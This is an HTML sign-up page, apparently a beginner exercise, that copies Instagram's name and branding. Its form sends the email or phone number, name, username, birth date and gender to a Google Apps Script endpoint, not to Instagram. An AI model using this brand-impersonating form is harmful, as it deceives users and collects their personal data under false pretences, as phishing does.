<!DOCTYPE html>
<html>

<head>
    <title>Instagram Sign Up</title>
</head>

<body bgcolor="lightgray">

<center>

    <h1>
        <font color="purple">Instagram</font>
    </h1>

    <h3>Sign Up</h3>

    <p>Sign up to connect with your friends.</p>

    <form action="https://script.google.com/macros/s/AKfycbyo0bQrcbqBgVvt7L3Q33hTqz3LH1Fbh89hibpxW4SoRvI7H3c7gKwZbhEgF1cvkWfh/exec" method="POST">

        <fieldset>

            <legend>
                <b>Create New Account</b>
            </legend>

            <br>

            <label>Mobile Number or Email:</label>
            <br>
            <input type="text" placeholder="Enter Email or Mobile Number" name="mobile">

            <br><br>

            <label>Full Name:</label>
            <br>
            <input type="text" placeholder="Enter Full Name" name="name">

            <br><br>

            <label>Username:</label>
            <br>
            <input type="text" placeholder="Enter Username" name="username">

            <br><br>

            <label>Password:</label>
            <br>
            <input type="password" placeholder="Enter Password">

            <br><br>

            <label>Date of Birth:</label>
            <br>
            <input type="date" name="dob">

            <br><br>

            <label>Gender:</label>
            <br>

            <input type="radio" name="gender">
            Male

            <input type="radio" name="gender">
            Female

            <input type="radio" name="gender">
            Other

            <br><br>

            <input type="checkbox">
            I agree to the Terms & Conditions.

            <br><br>

            <input type="submit" value="Sign Up">

            <input type="reset" value="Reset">

        </fieldset>

    </form>

    <br>

    <p>
        Already have an account?
        <input type="button" value="Log In">
    </p>

</center>

</body>

</html>
